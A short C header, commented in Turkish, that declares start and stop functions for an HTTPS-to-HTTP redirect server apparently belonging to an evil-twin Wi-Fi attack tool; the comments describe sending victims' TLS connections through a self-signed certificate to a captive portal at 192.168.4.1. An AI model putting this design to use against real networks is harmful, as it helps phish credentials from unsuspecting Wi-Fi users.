#ifndef HTTPS_REDIRECT_H
#define HTTPS_REDIRECT_H

// HTTPS → HTTP yönlendirme sunucusu (port 443)
// Evil Twin aktifken port 443'e gelen tüm TLS bağlantılarını
// http://192.168.4.1 adresine yönlendirir.
// Self-signed EC P-256 sertifika kullanır — kurbanın tarayıcısı
// uyarı gösterir fakat devam ederse captive portal açılır.
void https_redirect_start();
void https_redirect_stop();

#endif
